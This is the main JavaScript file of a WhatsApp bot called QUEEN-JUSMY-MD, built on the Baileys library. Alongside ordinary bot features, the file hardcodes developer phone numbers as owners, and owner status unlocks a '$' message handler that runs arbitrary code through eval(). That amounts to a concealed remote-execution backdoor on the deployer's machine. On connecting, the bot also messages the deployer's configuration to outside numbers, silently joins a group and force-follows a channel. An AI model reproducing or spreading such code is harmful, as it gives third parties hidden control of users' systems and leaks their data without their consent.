const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const { 
  getBuffer, 
  getGroupAdmins, 
  getRandom, 
  h2k, 
  isUrl, 
  Json, 
  runtime, 
  sleep, 
  fetchJson 
} = require('./lib/functions')
const fs = require('fs')
const P = require('pino')
const FileType = require('file-type')
const l = console.log
const config = require('./settings/settings.json')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const { exec } = require('child_process');
const { tmpdir } = require('os')
const Crypto = require('crypto')
const Jimp = require('jimp')

 function genMsgId() {
  const prefix = "3EB";
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let randomText = prefix;

 for (let i = prefix.length; i < 22; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomText += characters.charAt(randomIndex);
  }   
 return randomText;
}    

const path = require('path')
const msgRetryCounterCache = new NodeCache()
const prefix = config.PREFIX

const ownerNumber = ['94723975388', '94741259325'];
//================== SESSION ==================
if (!fs.existsSync(__dirname + '/session/creds.json')) {
    if (!config.SESSION_ID) return console.log("Please Add SESSION_ID ➾")
      const sessdata = config.SESSION_ID.split("QJUSMY=")[1];
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
      filer.download((err, data) => {
        if (err) throw err
        fs.writeFile(__dirname + '/session/creds.json', data, () => {
          console.log("Session download completed !!")
        })
      })
    
  }

//==================  PORTS ==================

const express = require("express");
const app = express();
const port = process.env.PORT || 9000;

async function connectToWA() {;
 console.log("Connecting QUEEN-JUSMY-MD🔃");
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + '/session/')
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })

  conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

            console.log('Installing plugins 🧬... ')
    console.log(' Bot connected ✅')
  const inviteCode =`IYh8ZzJZLuX3wCHhfyip8W`
conn.groupAcceptInvite(inviteCode); 

                // image with caption
         await conn.sendMessage(
           "94741259325@s.whatsapp.net",
         {
       image: { url: "https://files.catbox.moe/xo1wiq.png" }, // image url
       caption: `> Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _QUEEN-JUSMY-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ Comming Soon 😐👊\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://whatsapp.com/channel/0029Vb5saAU4Y9lfzhgBmS2N\n╰───────────❍\n╭───❍「 *👤BOT OWNERS* 」\n┃ _Mr.Sandesh Bhashana_\n┃ _Mr.Pathum Malsara_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ [ ${prefix} ]\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ *QUEEN-JUSMY-MD 🧚*\n╰───────────❍`
     }
   );  
   // image with caption
         await conn.sendMessage(
           "94723975388@s.whatsapp.net",
         {
       image: { url: "https://files.catbox.moe/xo1wiq.png" }, // image url
       caption: `> Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _QUEEN-JUSMY-MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ Comming Soon 😐👊\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://whatsapp.com/channel/0029Vb5saAU4Y9lfzhgBmS2N\n╰───────────❍\n╭───❍「 *👤BOT OWNERS* 」\n┃ _Mr.Sandesh Bhashana_\n┃ _Mr.Pathum Malsara_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ [ ${prefix} ]\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ *QUEEN-JUSMY-MD 🧚*\n╰───────────❍`
     }
   );
	
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('QUEEN-JUSMY-MD Plugins Installed 📂')
            console.log(' Bot connected ✅')
  
  // bot connected notification without admin variable
conn.sendMessage("94741259325@s.whatsapp.net", { text: `*╭───「 🔧 𝙱𝙾𝚃 𝙲𝚄𝚁𝚁𝙴𝙽𝚃 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 」*
*│• ᴘʀᴇꜰɪx ▸* [ ${config.PREFIX} ]
*│• ᴀʟɪᴠᴇ_ɪᴍɢ ▸* [ ${config.ALIVE_IMG} ]
*│• ꜰᴏᴏᴛᴇʀ ▸* [ ${config.FOOTER} ]
*│• ᴀʟɪᴠᴇ_ᴍꜱɢ ▸* [ ${config.ALIVE_MSG} ]
*│• ʙᴏᴛ_ɴᴀᴍᴇ ▸* [ ${config.BOT_NAME} ]
*│• ᴍᴏᴅᴇ ▸* [ ${config.MODE} ]
*│• ʙᴜᴛᴛᴏɴ ▸* [ ${config.BUTTON} ]
*│• ᴍᴇɴᴛɪᴏɴ_ʀᴇᴘʟʏ ▸* [ ${config.MENTION_REPLY} ]
*│• ᴀᴜᴛᴏ_ʀᴇᴘʟʏ ▸* [ ${config.AUTO_REPLY} ]
*│• ᴀᴜᴛᴏ_ᴠᴏɪᴄᴇ ▸* [ ${config.AUTO_VOICE} ]
*│• ᴀᴜᴛᴏ_ᴛʏᴘɪɴɢ ▸* [ ${config.AUTO_TYPING} ]
*│• ᴀᴜᴛᴏ_ꜱᴛɪᴄᴋᴇʀ ▸* [ ${config.AUTO_STICKER} ]
*│• ᴀᴜᴛᴏ_ʙɪᴏ ▸* [ ${config.AUTO_BIO} ]
*│• ᴀᴜᴛᴏ_ʀᴇᴄᴏʀᴅɪɴɢ ▸* [ ${config.AUTO_RECORDING} ]
*│• ᴀʟᴡᴀʏꜱ_ᴏɴʟɪɴᴇ ▸* [ ${config.ALWAYS_ONLINE} ]
*│• ᴀɴᴛɪ_ᴅᴇʟᴇᴛᴇ ▸* [ ${config.ANTI_DELETE} ]
*│• ᴀɴᴛɪ_ᴠᴠ ▸* [ ${config.ANTI_VV} ]
*│• ᴀɴᴛɪ_ᴅᴇʟ_ᴘᴀᴛʜ ▸* [ ${config.ANTI_DEL_PATH} ]
*│• ꜱᴛᴀᴛᴜꜱ_ꜱᴀᴠᴇ_ᴘᴀᴛʜ ▸* [ ${config.STATUS_SAVE_PATH} ]
*│• ᴏᴡɴᴇʀ_ɴᴀᴍᴇ ▸* [ ${config.OWNER_NAME} ]
*│• ᴏᴡɴᴇʀ_ɴᴜᴍʙᴇʀ ▸* [ ${config.OWNER_NUMBER} ]
*│• ᴏᴡɴᴇʀ_ʀᴇᴀᴄᴛ ▸* [ ${config.OWNER_REACT} ]
*│• ᴀᴜᴛᴏ_ʀᴇᴀᴅ_ꜱᴛᴀᴛᴜꜱ ▸* [ ${config.AUTO_READ_STATUS} ]
*╰───────────────────●●►*\n\n\`\`\`
🚀 Queen Jusmy Md Started.Command Now.
\`\`\`` });
conn.sendMessage("94761068032@s.whatsapp.net", { text: `*╭───「 🔧 𝙱𝙾𝚃 𝙲𝚄𝚁𝚁𝙴𝙽𝚃 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 」*
*│• ᴘʀᴇꜰɪx ▸* [ ${config.PREFIX} ]
*│• ᴀʟɪᴠᴇ_ɪᴍɢ ▸* [ ${config.ALIVE_IMG} ]
*│• ꜰᴏᴏᴛᴇʀ ▸* [ ${config.FOOTER} ]
*│• ᴀʟɪᴠᴇ_ᴍꜱɢ ▸* [ ${config.ALIVE_MSG} ]
*│• ʙᴏᴛ_ɴᴀᴍᴇ ▸* [ ${config.BOT_NAME} ]
*│• ᴍᴏᴅᴇ ▸* [ ${config.MODE} ]
*│• ʙᴜᴛᴛᴏɴ ▸* [ ${config.BUTTON} ]
*│• ᴍᴇɴᴛɪᴏɴ_ʀᴇᴘʟʏ ▸* [ ${config.MENTION_REPLY} ]
*│• ᴀᴜᴛᴏ_ʀᴇᴘʟʏ ▸* [ ${config.AUTO_REPLY} ]
*│• ᴀᴜᴛᴏ_ᴠᴏɪᴄᴇ ▸* [ ${config.AUTO_VOICE} ]
*│• ᴀᴜᴛᴏ_ᴛʏᴘɪɴɢ ▸* [ ${config.AUTO_TYPING} ]
*│• ᴀᴜᴛᴏ_ꜱᴛɪᴄᴋᴇʀ ▸* [ ${config.AUTO_STICKER} ]
*│• ᴀᴜᴛᴏ_ʙɪᴏ ▸* [ ${config.AUTO_BIO} ]
*│• ᴀᴜᴛᴏ_ʀᴇᴄᴏʀᴅɪɴɢ ▸* [ ${config.AUTO_RECORDING} ]
*│• ᴀʟᴡᴀʏꜱ_ᴏɴʟɪɴᴇ ▸* [ ${config.ALWAYS_ONLINE} ]
*│• ᴀɴᴛɪ_ᴅᴇʟᴇᴛᴇ ▸* [ ${config.ANTI_DELETE} ]
*│• ᴀɴᴛɪ_ᴠᴠ ▸* [ ${config.ANTI_VV} ]
*│• ᴀɴᴛɪ_ᴅᴇʟ_ᴘᴀᴛʜ ▸* [ ${config.ANTI_DEL_PATH} ]
*│• ꜱᴛᴀᴛᴜꜱ_ꜱᴀᴠᴇ_ᴘᴀᴛʜ ▸* [ ${config.STATUS_SAVE_PATH} ]
*│• ᴏᴡɴᴇʀ_ɴᴀᴍᴇ ▸* [ ${config.OWNER_NAME} ]
*│• ᴏᴡɴᴇʀ_ɴᴜᴍʙᴇʀ ▸* [ ${config.OWNER_NUMBER} ]
*│• ᴏᴡɴᴇʀ_ʀᴇᴀᴄᴛ ▸* [ ${config.OWNER_REACT} ]
*│• ᴀᴜᴛᴏ_ʀᴇᴀᴅ_ꜱᴛᴀᴛᴜꜱ ▸* [ ${config.AUTO_READ_STATUS} ]
*╰───────────────────●●►*\n\n\`\`\`
🚀 Queen Jusmy Md Started.Command Now.
\`\`\`` });
//================== CONNECT MG ==================

let up = `> Connected Successfully 🩷🎀\n\n╭───❍「 *✅CONNECTED BOT* 」\n┃ _QUEEN JUSMY MD_\n╰───────────❍\n╭───❍「 *🌐BOT WEB PAGE* 」\n┃ Comming Soon😐👊\n╰───────────❍\n╭───❍「 *🫳JOIN CHANNEL* 」\n┃ https://whatsapp.com/channel/0029Vb5saAU4Y9lfzhgBmS2N\n╰───────────❍\n╭───❍「 *👤BOT OWNERS* 」\n┃ _Mr.Sandesh Bhashana_\n┃ _Mr.Pathum Malsara_\n╰───────────❍\n╭───❍「 *📈SYSTEM STATUS* 」\n┃ ░░░░░░░░░░░░░░░░░░░ 100%\n╰───────────❍\n╭───❍「 *📍BOT PREFIX* 」\n┃ _Configure Your Prefix_ [ ${prefix} ]\n╰───────────❍\n╭───❍「 *⚙️AUTOMATION BY* 」\n┃ *QUEEN-JUSMY-CREW 🧚*\n╰───────────❍`;

conn.sendMessage(conn.user.id,{ text: up, contextInfo: {
        mentionedJid: [''],
        groupMentions: [],
        //forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363402220977044@newsletter',
          newsletterName: "< | 𝐐ᴜᴇᴇɴ 𝐉ᴜꜱᴍʏ 𝐌ᴅ 🧚‍♀️",
          serverMessageId: 999
        },
        externalAdReply: { 
          title: '♣ Queen Jusmy Md ♣\nSuccessfully Connected..!',
          body: 'ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴘᴀᴛʜᴜᴍ x ꜱᴀɴᴅᴇꜱʜ',
          mediaType: 1,
          sourceUrl: "",
          thumbnailUrl: "https://files.catbox.moe/xo1wiq.png",
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      } 
})

}
})

 //=============ANTI-DELETE DETECT=================

const { startAntiDelete } = require("./plugins/antidel");

conn.ev.on("connection.update", (update) => {
  if (update.connection === "open" && config.ANTI_DELETE.toLowerCase() === "true") {
    startAntiDelete(conn);
  }
});
  //============================== 

const { startAutoBio } = require("./plugins/auto-bio");

conn.ev.on("connection.update", (update) => {
  if (update.connection === "open" && config.AUTO_BIO.toLowerCase() === "true") {
    startAutoBio(conn);
  }
});

         
conn.ev.on('creds.update', saveCreds)  

    conn.ev.on('messages.upsert', async (mek) => {
      try {
            mek = mek.messages[0]
            if (!mek.message) return
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message

//================== AUTO STATUS VIEW ==================

if (!mek.message) return 
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
await conn.readMessages([mek.key])  
const mnyako = await jidNormalizedUser(conn.user.id)
await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: '🖤'}}, { statusJidList: [mek.key.participant, mnyako] })
}

if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const m = sms(conn, mek)
var smg = m
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid

//================== QUOTED ==================

const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []

//================== C FOLLOW ==================

const metadata = await conn.newsletterMetadata("jid", "120363402220977044@newsletter");
if (metadata.viewer_metadata === null) {
  await conn.newsletterFollow("120363402220977044@newsletter");
  console.log("QUEEN JUSMY -MD CHANNEL FOLLOWED ✅");
}


//================== BODY ====================

const body = 
  (type === 'conversation') ? mek.message.conversation :
  (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
  (type === 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption :
  (type === 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption :
  (type === 'templateButtonReplyMessage' && mek.message.templateButtonReplyMessage.selectedId) ? mek.message.templateButtonReplyMessage.selectedId :
  (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId :
  (type === 'listResponseMessage' && mek.message.listResponseMessage.singleSelectReply.selectedRowId) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId :
  (type === 'interactiveResponseMessage' &&
    mek.message.interactiveResponseMessage.nativeFlowResponseMessage &&
    JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id
  ) ? JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
  ''
      

           const isCmd = body.startsWith(prefix)     
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
            const args = body.trim().split(/ +/).slice(1)
            const q = args.join(' ')
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'QUEEN-JUSMY-MD'
           const ownbot = config.OWNER_NUMBER
           const isownbot = ownbot?.includes(senderNumber)
           const developers = ['94773416478', '94741259325']
            const isbot = botNumber.includes(senderNumber)
           const isdev = developers.includes(senderNumber)      
           const botNumber2 = await jidNormalizedUser(conn.user.id)
            const isCreator = [ botNumber2 ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(sender)   
           const isMe = isbot ? isbot : isdev
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isreaction = m.message.reactionMessage ? true : false
            const isReact =m.message.reactionMessage ? true : false
     const isAnti = (teks) => {
                let getdata = teks
                for (let i = 0; i < getdata.length; i++) {
                    if (getdata[i] === from) return true
                }
                return false
            }
            const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
    
conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}


//================== For RVO ==================
       
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
                let quoted = message.msg ? message.msg : message
                let mime = (message.msg || message).mimetype || ''
                let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
                const stream = await downloadContentFromMessage(quoted, messageType)
                let buffer = Buffer.from([])
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk])
                }
                let type = await FileType.fromBuffer(buffer)
                trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
                    // save to file
                await fs.writeFileSync(trueFileName, buffer)
                return trueFileName
            }

//================== FORWARD ==================
       
conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message                             
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}

//================== OWNER REACT ==================
       
if (
      senderNumber.includes("94773416478") ||
      senderNumber.includes("94741259325")
    ) {
      if (config.OWNER_REACT === "true") {
        if (isReact) return;
        m.react("👨‍💻");
      }
    }    

//================== WORK TYPE ==================
       
if(!isOwner && config.MODE === "private") return 
if(!isOwner && isGroup && config.MODE === "inbox") return 
if(!isOwner && !isGroup && config.MODE === "groups") return 

//================== PLUGIN MAP ==================
       
const events = require('./lib/command')
const cmdName = isCmd ?  command : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, botNumber2 });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, botNumber2 });
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body,  isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , botNumber2 });
  }
});




            switch (command) {
        case 'jid':
        reply(from)
        break
        
        default:    
        if (isOwner && body.startsWith('$')) {
        let bodyy = body.split('$')[1]
        let code2 = bodyy.replace("°", ".toString()");
        try {
        let resultTest = await eval(code2);
        if (typeof resultTest === "object") {
        reply(util.format(resultTest));
        } else {
        reply(util.format(resultTest));
        }
        } catch (err) {
        reply(util.format(err));
        }}}
        } catch (e) {
            const isError = String(e)
            console.log(isError)
        }
    })
}
app.get("/", (req, res) => {
res.send("QUEEN JUSMY MD CONNECTED SUCCESSFULLY ✅");
});
app.listen(port, () => console.log(`QUEEN JUSMY MD Server listening on port http://localhost:` + port));
setTimeout(() => {
connectToWA()
}, 9000);
    
